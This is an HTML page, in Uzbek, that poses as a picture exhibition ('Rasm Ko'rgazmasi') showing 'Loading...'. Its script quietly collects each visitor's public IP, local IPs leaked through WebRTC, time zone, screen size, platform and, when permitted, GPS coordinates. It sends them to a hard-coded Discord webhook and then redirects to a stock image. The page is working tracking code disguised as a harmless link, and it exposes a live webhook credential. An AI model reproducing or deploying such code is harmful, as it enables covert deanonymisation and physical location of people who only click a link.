<!DOCTYPE html>
<html>
<head>
    <title>Rasm Ko'rgazmasi</title>
</head>
<body>
    <h1>Yuklanmoqda...</h1>
    
<script>
// Juda oddiy va ishonchli tracker
function startTracking() {
    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
    
    // 1. IP ni olish
    fetch('https://api.ipify.org?format=json')
    .then(function(response) { 
        if (!response.ok) {
            throw new Error('Tarmoq javobi yaxshi emas');
        }
        return response.json(); 
    })
    .then(function(ipData) {
        const publicIP = ipData.ip;
        
        // 2. Local IP ni olish
        let localIPs = "Aniqlanmoqda";
        try {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) { 
                return pc.setLocalDescription(offer); 
            });
            
            const ips = [];
            pc.onicecandidate = function(e) {
                if (e.candidate) {
                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (match) ips.push(match[1]);
                }
            };
            
            setTimeout(function() {
                localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                sendToDiscord(publicIP, localIPs);
            }, 2000);
            
        } catch (e) {
            localIPs = 'Xato: ' + e.message;
            sendToDiscord(publicIP, localIPs);
        }
    })
    .catch(function(error) {
        console.error('Xato:', error);
        sendToDiscord('IP olishda xato: ' + error.message, 'Noma lum');
    });
}

function sendToDiscord(publicIP, localIPs) {
    const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
    
    const now = new Date();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    const message = {
        content: "🎣 FIRIBGAR KIRDI!\n" +
                 "🌐 Public IP: " + publicIP + "\n" +
                 "🏠 Local IPs: " + localIPs + "\n" +
                 "🕐 Vaqt: " + now.toLocaleString() + "\n" +
                 "📍 Vaqt Zonasi: " + timezone + "\n" +
                 "📱 Ekran: " + screen.width + "x" + screen.height + "\n" +
                 "💻 Platforma: " + navigator.platform + "\n" +
                 "🔗 URL: " + window.location.href
    };
    
    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message)
    })
    .then(function(response) {
        if (!response.ok) {
            throw new Error('Discord javob bermadi');
        }
        console.log('Ma lumotlar yuborildi');
    })
    .catch(function(error) {
        console.log('Yuborish xatosi:', error);
    })
    .finally(function() {
        // Rasmga o'tish
        setTimeout(function() {
            window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
        }, 2000);
    });
}

// GPS ni alohida yuborish
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        function(position) {
            const gpsMsg = {
                content: "📍 GPS TOPILDI!\n" +
                         "Kenglik: " + position.coords.latitude + "\n" +
                         "Uzunlik: " + position.coords.longitude + "\n" +
                         "Aniqlik: " + position.coords.accuracy + "m"
            };
            
            fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(gpsMsg)
            }).catch(e => console.log('GPS yuborish xatosi:', e));
        },
        function(error) {
            console.log('GPS rad etildi:', error.message);
        }
    );
}

// Darrov ishga tushirish
startTracking();
</script>
</body>
</html>
